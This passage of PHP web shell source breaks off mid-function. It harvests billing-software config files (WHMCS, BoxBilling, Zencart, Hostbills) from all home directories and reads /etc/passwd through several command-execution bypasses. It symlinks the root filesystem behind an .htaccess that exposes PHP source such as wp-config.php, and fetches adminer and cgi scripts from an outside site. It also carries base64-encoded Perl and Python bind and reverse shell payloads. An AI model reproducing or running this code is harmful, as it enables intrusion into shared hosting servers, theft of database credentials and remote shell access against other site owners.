					"/home/$user_con/public_html/SUPPORTES/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Supportes/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/supportes/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/domains/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/domain/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Hosting/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/HOSTING/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/hosting/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/CART/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Cart/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/cart/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/ORDER/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Order/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/order/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/CLIENT/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Client/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/client/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Clientarea/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/clientarea/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/SUPPORT/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Support/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/support/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/BILLING/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Billing/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/billing/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/BUY/sumitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Buy/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/buy/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/MANAGE/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Manage/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/manage/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/ClientSupport/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Clientsupport/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/clientsupport/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/CHECKOUT/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Checkout/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/checkout/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/BILLINGS/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Billings/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/billings/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/BASKET/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Basket/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/basket/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/SECURE/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Secure/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/secure/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/SALES/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Sales/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/sales/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/BILL/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Bill/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/bill/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/PURCHASE/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Purchase/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/purchase/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/ACCOUNT/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Account/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/account/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/USER/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/User/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/user/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/CLIENTS/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Clients/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/clients/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/BILLINGS/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/Billings/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/billings/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/MY/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/My/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/my/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/secure/whm/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/secure/whmcs/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/panel/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/clientes/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/cliente/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/support/order/submitticket.php" => "WHMCS",
					"/home/$user_con/public_html/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/boxbilling/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/box/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/host/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/Host/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/supportes/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/support/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/hosting/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/cart/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/order/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/client/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/clients/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/cliente/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/clientes/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/billing/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/billings/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/my/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/secure/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/support/order/bb-config.php" => "BoxBilling",
					"/home/$user_con/public_html/includes/dist-configure.php" => "Zencart",
					"/home/$user_con/public_html/zencart/includes/dist-configure.php" => "Zencart",
					"/home/$user_con/public_html/products/includes/dist-configure.php" => "Zencart",
					"/home/$user_con/public_html/cart/includes/dist-configure.php" => "Zencart",
					"/home/$user_con/public_html/shop/includes/dist-configure.php" => "Zencart",
					"/home/$user_con/public_html/includes/iso4217.php" => "Hostbills",
					"/home/$user_con/public_html/hostbills/includes/iso4217.php" => "Hostbills",
					"/home/$user_con/public_html/host/includes/iso4217.php" => "Hostbills",
					"/home/$user_con/public_html/Host/includes/iso4217.php" => "Hostbills",
					"/home/$user_con/public_html/supportes/includes/iso4217.php" => "Hostbills",
					"/home/$user_con/public_html/support/includes/iso4217.php" => "Hostbills",
					"/home/$user_con/public_html/hosting/includes/iso4217.php" => "Hostbills",
					"/home/$user_con/public_html/cart/includes/iso4217.php" => "Hostbills",
					"/home/$user_con/public_html/order/includes/iso4217.php" => "Hostbills",
					"/home/$user_con/public_html/client/includes/iso4217.php" => "Hostbills",
					"/home/$user_con/public_html/clients/includes/iso4217.php" => "Hostbills",
					"/home/$user_con/public_html/cliente/includes/iso4217.php" => "Hostbills",
					"/home/$user_con/public_html/clientes/includes/iso4217.php" => "Hostbills",
					"/home/$user_con/public_html/billing/includes/iso4217.php" => "Hostbills",
					"/home/$user_con/public_html/billings/includes/iso4217.php" => "Hostbills",
					"/home/$user_con/public_html/my/includes/iso4217.php" => "Hostbills",
					"/home/$user_con/public_html/secure/includes/iso4217.php" => "Hostbills",
					"/home/$user_con/public_html/support/order/includes/iso4217.php" => "Hostbills"
				);	
				foreach($grab_config as $config => $nama_config){
					$ambil_config = file_get_contents($config);
					if($ambil_config == ''){
					}else{
						$file_config = fopen("HSS_config/$user_con-$nama_config.txt","w");
						fputs($file_config,$ambil_config);
					}
				}
			}		
		}
		echo "<p class='text-center'>Success Get Config!!</p>
		<a href='?dir=$dir/HSS_config' class='btn btn-success btn-block mb-4'>Click Here</a>";
	}else{
		echo "<form method='post'>
			<p class='text-danger'>/etc/passwd error ?  <a href='?dir=$dir&tool=passwbypass'>Bypass Here</a></p>
			<textarea name='passwd' class='form-control' rows='13'>".file_get_contents('/etc/passwd')."</textarea><br/>
			<input type='submit' class='btn btn-danger btn-block' value='Get Config!!'>
		</form>";
	}
	exit;
}
function toolBypasswd($dir,$file){
	echo '<div claas="container">
		<form method="POST">
			<p class="text-center">Bypass etc/passwd With :</p>
			<div class="d-flex justify-content-center flex-wrap">
				<input type="submit" class="fiture btn btn-danger btn-sm" value="System Function" name="syst">
				<input type="submit" class="fiture btn btn-danger btn-sm" value="Passthru Function" name="passth">
				<input type="submit" class="fiture btn btn-danger btn-sm" value="Exec Function" name="ex">
				<input type="submit" class="fiture btn btn-danger btn-sm" value="Shell_exec Function" name="shex">
				<input type="submit" class="fiture btn btn-danger btn-sm" value="Posix_getpwuid Function" name="melex">
			</div><hr/>
			<p class="text-center">Bypass User With :</p>
			<div class="d-flex justify-content-center flex-wrap">
				<input type="submit" class="fiture btn btn-warning btn-sm" value="Awk Program" name="awkuser">
				<input type="submit" class="fiture btn btn-warning btn-sm" value="System Function" name="systuser">
				<input type="submit" class="fiture btn btn-warning btn-sm" value="Passthru Function" name="passthuser">	
				<input type="submit" class="fiture btn btn-warning btn-sm" value="Exec Function" name="exuser">		
				<input type="submit" class="fiture btn btn-warning btn-sm" value="Shell_exec Function" name="shexuser">
			</div>
		</form>';
		$mail = 'ls /var/mail';
		$paswd = '/etc/passwd';
		if($_POST['syst']){
			echo"<textarea class='form-control' rows='13'>";
			echo system("cat $paswd");
			echo"</textarea><br/>";
		}
		if($_POST['passth']){
			echo"<textarea class='form-control' rows='13'>";
			echo passthru("cat $paswd");
			echo"</textarea><br/>";
		}
		if($_POST['ex']){
			echo"<textarea class='form-control' rows='13'>";
			echo exec("cat $paswd");
			echo"</textarea><br/>";
		}
		if($_POST['shex']){
			echo"<textarea class='form-control' rows='13'>";
			echo shell_exec("cat $paswd");
			echo"</textarea><br/>";
		}
		if($_POST['melex']){
			echo"<textarea class='form-control' rows='13'>";
			for($uid=0;$uid<6000;$uid++){ 
				$ara = posix_getpwuid($uid);
				if (!empty($ara)){
					while (list ($key, $val) = each($ara)){
						print "$val:";
					}
					print "n";
				}
			}
			echo"</textarea><br/>";
		}
		
		if ($_POST['awkuser']){
			echo"<textarea class='form-control' rows='13'>
				".shell_exec("awk -F: '{ print $1 }' $paswd | sort")."
			</textarea><br/>";
		}
		if ($_POST['systuser']){
			echo"<textarea class='form-control' rows='13'>";
			echo system("$mail");
			echo "</textarea><br>";
		}
		if ($_POST['passthuser']){
			echo"<textarea class='form-control' rows='13'>";
			echo passthru("$mail");
			echo "</textarea><br>";
		}
		if ($_POST['exuser']){
			echo"<textarea class='form-control' rows='13'>";
			echo exec("$mail");
			echo "</textarea><br>";
		}
		if ($_POST['shexuser']){
			echo"<textarea class='form-control' rows='13'>";
			echo shell_exec("$mail");
			echo "</textarea><br>";
		}
	echo "</div>";
	exit;
}
function toolAdminer($dir,$file){
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi){
		$fp = fopen($isi, "w");
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')){
		echo "<a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
	}else{
		if(adminer("https://wsoshell.com/txt/adminer.txt","adminer.php")){
			echo "<p class='text-center'>Successfully Created adminer</p><a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
		}else{
			echo "<p class='text-center text-danger'>Failed to Create Adminer</p>";
		}
	}
	exit;
}
function toolcgi($dir,$file){
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function cgi($url, $isi){
		$fp = fopen($isi, "w");
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('cgi.php')){
		echo "<a href='$full/cgi.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login cgi</a>";
	}else{
		if(cgi("https://wsoshell.com/txt/cgi.txt","cgi.php")){
			echo "<p class='text-center'>Successfully Created cgi</p><a href='$full/cgi.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login cgi</a>";
		}else{
			echo "<p class='text-center text-danger'>Failed to Create cgi</p>";
		}
	}
	exit;
}
function toolSym($dir,$file){
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	$d0mains = @file("/etc/named.conf");
	if(!$d0mains){
		die ("[ <a href='?dir=$dir&tool=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&tool=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&tool=sym_bypas'>Symlink Bypass</a> ]<br/><font color='red'>Error tidak dapat membaca  /etc/named.conf</font><br/><br/>");
	}
	##htaccess
	if($d0mains){
		@mkdir("HSS_sym",0777);
		@chdir("HSS_sym");
		@exe("ln -s / root");
		$file3 = 'Options Indexes FollowSymLinks
		DirectoryIndex indsc.html
		AddType text/plain php html php5 phtml
		AddHandler text/plain php html php5 phtml
		Satisfy Any';
		$fp3 = fopen('.htaccess','w');
		$fw3 = fwrite($fp3,$file3);@fclose($fp3);
		echo "[ <a href='?dir=$dir&tool=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&tool=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&tool=sym_bypas'>Symlink Bypass</a> ]
		<div class='tmp'>
		<table class='text-center table-responsive'>
			<thead class='bg-info'>
				<th>No.</th>
				<th>Domains</th>
				<th>Users</th>
				<th>symlink </th>
			</thead>";
			$dcount = 1;
			foreach($d0mains as $d0main){
				if(eregi("zone",$d0main)){
					preg_match_all('#zone "(.*)"#', $d0main, $domains);
					flush();
					if(strlen(trim($domains[1][0])) > 2){
						$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
						echo "<tr>
							<td>".$dcount."</td>
							<td class='text-left'><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td>
							<td>".$user['name']."</td>
							<td><a href='$full/HSS_sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a></td>
						</tr>";
						flush();
						$dcount++;
					}
				}
			}
		echo "</table></div>";
	}else{
		$TEST = @file('/etc/passwd');
		if ($TEST){
			@mkdir("HSS_sym",0777);
			@chdir("HSS_sym");
			@exe("ln -s / root");
			$file3 = 'Options Indexes FollowSymLinks
			DirectoryIndex indsc.html
			AddType text/plain php html php5 phtml
			AddHandler text/plain php html php5 phtml
			Satisfy Any';
			$fp3 = fopen('.htaccess','w');
			$fw3 = fwrite($fp3,$file3);
			@fclose($fp3);
			echo "[ <a href='?dir=$dir&tool=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&tool=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&tool=sym_bypas'>Symlink Bypass</a> ]
			<div class='tmp'>
			<table class='text-center table-responsive'>
				<thead class='bg-warning'>
					<th>No.</th>
					<th>Users</th>
					<th>symlink </th>
				</thead>";
				$dcount = 1;
				$file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
				while(!feof($file)){
					$s = fgets($file);
					$matches = array();
					$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
					$matches = str_replace("home/","",$matches[1]);
					if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
					continue;
					echo "<tr>
						<td>".$dcount."</td>
						<td>".$matches."</td>
						<td><a href=$full/HSS_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
					</tr>";
					$dcount++;
				}
				fclose($file);
			echo "</table></div>";
		}else{
		if($os != "Windows"){
			@mkdir("HSS_sym",0777);
			@chdir("HSS_sym");
			@exe("ln -s / root");
			$file3 = 'Options Indexes FollowSymLinks
			DirectoryIndex indsc.html
			AddType text/plain php html php5 phtml
			AddHandler text/plain php html php5 phtml
			Satisfy Any';
			$fp3 = fopen('.htaccess','w');
			$fw3 = fwrite($fp3,$file3);@fclose($fp3);
			echo "[ <a href='?dir=$dir&tool=symread'>Bypass Read</a> ] [ <a href='?dir=$dir&tool=sym_404'>Symlink 404</a> ] [ <a href='?dir=$dir&tool=sym_bypas'>Symlink Bypass</a> ]
			<div class='tmp'><table class='text-center table-responsive'>
				<thead class='bg-danger'>
					<th>ID.</th>
					<th>Users</th>
					<th>symlink </th>
				</thead>";
				$temp = "";$val1 = 0;$val2 = 1000;
				for(;$val1 <= $val2;$val1++){
					$uid = @posix_getpwuid($val1);
					if ($uid)$temp .= join(':',$uid)."\n";
				}
				echo '<br/>';$temp = trim($temp);
				$file5 = fopen("test.txt","w");
				fputs($file5,$temp);
				fclose($file5);$dcount = 1;$file =
				fopen("test.txt", "r") or exit("Unable to open file!");
				while(!feof($file)){
					$s = fgets($file);$matches = array();
					$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
					$matches = str_replace("home/","",$matches[1]);
					if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
					continue;
					echo "<tr>
						<td>".$dcount."</td>
						<td>".$matches."</td>
						<td><a href=$full/HSS_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
					</tr>";
					$dcount++;
				}
				fclose($file);
			echo "</table></div>";
			unlink("test.txt");
			}
		}
	}
	exit;
}
function toolSymread($dir,$file){
	echo "read /etc/named.conf
	<form method='post' action='?dir=$dir&tool=symread&save=1'>
	<textarea class='form-control' rows='13' name='file'>";
		flush();
		flush();
		$file = '/etc/named.conf';
		$r3ad = @fopen($file, 'r');
		if ($r3ad){
			$content = @fread($r3ad, @filesize($file));
			echo "".htmlentities($content)."";
		}else if (!$r3ad){
			$r3ad = @show_source($file) ;
		}else if (!$r3ad){
			$r3ad = @highlight_file($file);
		}else if (!$r3ad){
			$sm = @symlink($file,'sym.txt');
			if ($sm){
				$r3ad = @fopen('HSS_sym/sym.txt', 'r');
				$content = @fread($r3ad, @filesize($file));
				echo "".htmlentities($content)."";
			}
		}
	echo "</textarea><br/><input type='submit' class='btn btn-danger form-control' value='Save'/> </form>";
	if(isset($_GET['save'])){
		$cont = stripcslashes($_POST['file']);
		$f = fopen('named.txt','w');
		$w = fwrite($f,$cont);
		if($w){
			echo '<br/>save has been successfully';
		}
		fclose($f);
	}
	exit;
}
function sym404($dir,$file){
	$cp = get_current_user();
	if($_POST['execute']){
		@rmdir("HSS_sym404");
		@mkdir("HSS_sym404", 0777);
		$dir = $_POST['dir'];
		$isi = $_POST['isi'];
		@system("ln -s ".$dir."HSS_sym404/".$isi);
		@symlink($dir,"HSS_sym404/".$isi);
		$inija = fopen("HSS_sym404/.htaccess", "w");
		@fwrite($inija,"ReadmeName ".$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain php html php5 phtml\nAddHandler text/plain php html php5 phtml\nSatisfy Any");
		echo'<a href="/HSS_sym404/" target="_blank" class="btn btn-success btn-block mb-3">Click Me!!</a>';
	}else{
		echo '<h2>Symlink 404</h2>
		<form method="post">
			File Target: <input type="text" class="form-control" name="dir" value="/home/'.$cp.'/public_html/wp-config.php"><br/>
			Save As: <input type="text" class="form-control" name="isi" placeholder="[Ex] file.txt"/><br/>
			<input type="submit" class="btn btn-danger btn-block" value="Execute" name="execute"/>
			<p class="text-muted">NB: Letak wp-config tidak semuanya berada di <u>public_html/wp-config.php</u> jadi silahkan ubah sesuai letaknya.</p>
		</form>';
	}
	exit;
}
function symBypass($dir,$file){
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	$pageFTP = 'ftp://'.$_SERVER["SERVER_NAME"].'/public_html/'.$_SERVER["REQUEST_URI"];
	$u = explode("/",$pageFTP );
	$pageFTP =str_replace($u[count($u)-1],"",$pageFTP );
	if(isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0){
		$cont = stripcslashes($_POST['file']);
		if(!file_exists('passwd.txt')){
			$f = @fopen('passwd.txt','w');
			$w = @fwrite($f,$cont);
			fclose($f);
		}
		if($w or @filesize('passwd.txt') > 0){
			echo "<div class='tmp'>
			<table width='100%' class='text-center table-responsive mb-4'>
				<thead class='bg-info'>
					<th>Users</th>
					<th>symlink</th>
					<th>FTP</th>
				</thead>";
				flush();
				$fil3 = file('passwd.txt');
				foreach ($fil3 as $f){
					$u=explode(':', $f);
					$user = $u['0'];
					echo "<tr>
						<td class='text-left pl-1'>$user</td>
						<td><a href='$full/sym/root/home/$user/public_html' target='_blank'>Symlink </a></td>
						<td><a href='$pageFTP/sym/root/home/$user/public_html' target='_blank'>FTP</a></td>
					</tr>";
					flush();
					flush();
				}
			echo "</tr></table></div>";
			die();
		}
	}
	echo "read /etc/passwd <font color='red'>error ?  </font><a href='?dir=".$dir."&tool=passwbypass'>Bypass Here</a>
	<form method='post' action='?dir=$dir&tool=sym_bypas&save=1'>
		<textarea class='form-control' rows='13' name='file'>";
			flush();
			$file = '/etc/passwd';
			$r3ad = @fopen($file, 'r');
			if ($r3ad){
				$content = @fread($r3ad, @filesize($file));
				echo "".htmlentities($content)."";
			}elseif(!$r3ad){
				$r3ad = @show_source($file) ;
			}elseif(!$r3ad){
				$r3ad = @highlight_file($file);
			}elseif(!$r3ad){
				for($uid=0;$uid<1000;$uid++){
				$ara = posix_getpwuid($uid);
				if (!empty($ara)){
					while (list ($key, $val) = each($ara)){
						print "$val:";
					}
					print "\n";
				}
			}
		}
		flush();
		echo "</textarea><br/>
		<input type='submit' class='btn btn-danger btn-block' value='Symlink'/>
	</form>";
	flush();
	exit;
}
function bcTool($dir,$file){
	echo "<h4 class='text-center mb-4'>Back Connect Tools</h4>
	<form method='post'>
		<div class='row'>
			<div class='col-md-10'>
				<span>Bind port to /bin/sh [Perl]</span><br/>
				<label>Port :</label>
				<div class='form-group input-group mb-4'>
					<input type='text' name='port' class='form-control' value='6969'>
					<input type='submit' name='bpl' class='btn btn-danger form-control' value='Reserve'>
				</div>
				<h5>Back-Connect</h5>
				<label>Server :</label>
				<input type='text' name='server' class='form-control mb-3' placeholder='". $_SERVER['REMOTE_ADDR'] ."'>
				<label>Port :</label>
				<div class='form-group input-group mb-4'>
					<input type='text' name='port' class='form-control' placeholder='443'>
					<select class='form-control' name='backconnect'>
						<option value='perl'>Perl</option>
						<option value='php'>PHP</option>
						<option value='python'>Python</option>
						<option value='ruby'>Ruby</option>
					</select>
				</div>
				<input type='submit' class='btn btn-danger btn-block' value='Connect'>
			</div>
		</div>
	</form>";
	if($_POST['bpl']){
		$bp = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
		$brt = @fopen('bp.pl','w');
		fwrite($brt,$bp);
		$out = exe("perl bp.pl ".$_POST['port']." 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre class='text-light'>$out\n".exe("ps aux | grep bp.pl")."</pre>";
		unlink("bp.pl");
	}
	if($_POST['backconnect'] == 'perl'){
		$bc = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
		$plbc = @fopen('bc.pl','w');
		fwrite($plbc,$bc);
		$out = exe("perl bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &");
		sleep(1);
		echo "<pre class='text-light'>$out\n".exe("ps aux | grep bc.pl")."</pre>";
		unlink("bc.pl");
	}
	if($_POST['backconnect'] == 'python'){
		$becaa = base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=");
		$pbcaa = @fopen('bcpyt.py','w');
		fwrite($pbcaa,$becaa);
		$out1 = exe("python bcpyt.py ".$_POST['server']." ".$_POST['port']);
		sleep(1);
		echo "<pre class='text-light'>$out1\n".exe("ps aux | grep bcpyt.py")."</pre>";
		unlink("bcpyt.py");
	}
	if($_POST['backconnect'] == 'ruby'){
